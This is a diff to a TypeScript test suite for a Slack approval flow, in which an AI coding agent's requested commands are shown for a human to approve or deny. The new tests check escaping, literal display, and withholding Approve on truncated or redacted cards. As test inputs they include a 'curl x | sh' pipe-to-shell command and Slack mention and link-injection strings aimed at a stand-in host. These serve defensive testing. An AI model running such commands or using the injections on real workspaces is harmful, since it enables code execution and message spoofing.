@@ -769,7 +769,11 @@ describe('/acorn and the project picker', () => {
 })
 
 describe('approvals', () => {
-  const pending = (h: Awaited<ReturnType<typeof harness>>, detail = 'pnpm test') => {
+  const pending = (
+    h: Awaited<ReturnType<typeof harness>>,
+    detail = 'pnpm test',
+    payload: Record<string, unknown> = {},
+  ) => {
     h.requests.push({
       taskId: '',
       sessionId: 'session-1',
@@ -779,7 +783,7 @@ describe('approvals', () => {
       turnId: 'turn-1',
       title: 'Run a command',
       detail,
-      payload: {},
+      payload,
       expiresAt: null,
       createdAt: 0,
       resolvedAt: null,
@@ -806,20 +810,32 @@ describe('approvals', () => {
       ...options.payload,
     })
   }
+  type Block = {
+    type: string
+    elements?: { type?: string; action_id: string; url?: string; text?: string; elements?: { text: string }[] }[]
+  }
   const card = (h: Awaited<ReturnType<typeof harness>>) =>
-    h.calls.filter((call) => call.method === 'chat.postMessage').at(-1)!.args.blocks as {
-      type: string
-      elements?: { action_id: string; url?: string }[]
-      text?: { text: string }
-    }[]
+    h.calls.filter((call) => call.method === 'chat.postMessage').at(-1)!.args.blocks as Block[]
+  /** The text of each preformatted block, as Slack shows it. */
+  const literals = (h: Awaited<ReturnType<typeof harness>>) =>
+    card(h)
+      .filter((block) => block.type === 'rich_text' && block.elements![0]!.type === 'rich_text_preformatted')
+      .map((block) => block.elements![0]!.elements![0]!.text)
+  const buttons = (h: Awaited<ReturnType<typeof harness>>) =>
+    card(h)
+      .at(-1)!
+      .elements!.map((element) => element.action_id)
+  const note = (h: Awaited<ReturnType<typeof harness>>) =>
+    card(h).find((block) => block.type === 'context')?.elements![0]!.text
 
   it('shows Approve and Deny to an owner who chose approvals from Slack, and answers their click', async () => {
     const h = await harness({ approvals: true })
     await withProject(h)
     await h.mention('test it')
-    await pending(h, 'pnpm test sk-live-123')
+    await pending(h)
     expect(h.reactions().at(-1)).toBe(`+${REACTIONS.waiting}`)
-    expect(card(h)[1]!.text!.text).toBe('```pnpm test [removed]```')
+    expect(literals(h)).toEqual(['pnpm test'])
+    expect(note(h)).toBeUndefined()
     expect(
       card(h)
         .at(-1)!
@@ -838,6 +854,85 @@ describe('approvals', () => {
     expect(
       h.calls.filter((call) => call.method === 'respond').map((call) => (call.args.body as { text: string }).text),
     ).toEqual([expect.stringMatching(/^Approved by James, /)])
+  })
+
+  it("shows the harness's command as typed, and Codex's command once", async () => {
+    const h = await harness({ approvals: true })
+    await withProject(h)
+    await h.mention('test it')
+    const command = 'echo <!channel> *done* ``` <https://evil.test|docs> && curl x | sh'
+    // Codex sends the command as the detail too.
+    await pending(h, command, { command })
+    expect(literals(h)).toEqual([command])
+    expect(JSON.stringify(card(h))).not.toContain('mrkdwn')
+    expect(buttons(h)).toEqual(['acorn_approve', 'acorn_deny'])
+  })
+
+  it('escapes the notification text, which Slack reads as mrkdwn', async () => {
+    const h = await harness({ approvals: true })
+    await withProject(h)
+    await h.mention('test it')
+    h.requests.push({
+      taskId: '',
+      sessionId: 'session-1',
+      requestId: 'req-1',
+      kind: 'permission',
+      status: 'pending',
+      turnId: 'turn-1',
+      title: '`echo <!here> & <https://evil.test|docs>`',
+      detail: 'execute',
+      payload: { command: 'echo <!here> & <https://evil.test|docs>' },
+      expiresAt: null,
+      createdAt: 0,
+      resolvedAt: null,
+    })
+    await h.rt.serial(() =>
+      h.approvals.requestChanged({
+        taskId: '',
+        sessionId: 'session-1',
+        requestId: 'req-1',
+        kind: 'permission',
+        status: 'pending',
+      }),
+    )
+    expect(h.posts().at(-1)).toBe('The agent asks: `echo &lt;!here&gt; &amp; &lt;https://evil.test|docs&gt;`')
+    expect(literals(h)).toEqual(['echo <!here> & <https://evil.test|docs>', 'execute'])
+  })
+
+  it('posts no Approve on a card that shows less than the request', async () => {
+    const long = 'x'.repeat(3_000)
+    for (const [detail, payload] of [
+      // Cut to fit Slack.
+      [long, { command: long }],
+      // A secret removed.
+      ['pnpm test sk-live-123', {}],
+      // Cut by the agents plugin to store it.
+      ['pnpm test…', { command: 'pnpm test…', truncated: true }],
+    ] as const) {
+      const h = await harness({ approvals: true })
+      await withProject(h)
+      await h.mention('test it')
+      await pending(h, detail, payload)
+      expect(buttons(h)).toEqual(['acorn_open'])
+      expect(note(h)).toMatch(/cut or hidden here, so answer it in Acorn/)
+      // A click that names Approve anyway, as a card from before this check could send, answers nothing.
+      await answer(h, 'acorn_approve')
+      expect(h.answers).toEqual([])
+      expect(h.calls.at(-1)).toMatchObject({
+        method: 'chat.postEphemeral',
+        args: { text: expect.stringMatching(/^This card can't show all of the request, so approve it in Acorn/) },
+      })
+    }
+    const cut = await harness({ approvals: true })
+    await withProject(cut)
+    await cut.mention('test it')
+    await pending(cut, long, { command: long })
+    expect(literals(cut)).toEqual([`${'x'.repeat(2_899)}…`])
+    const removed = await harness({ approvals: true })
+    await withProject(removed)
+    await removed.mention('test it')
+    await pending(removed, 'pnpm test sk-live-123')
+    expect(literals(removed)).toEqual(['pnpm test [removed]'])
   })
 
   it('links to Acorn instead when approvals from Slack are off, and says when Acorn answered first', async () => {
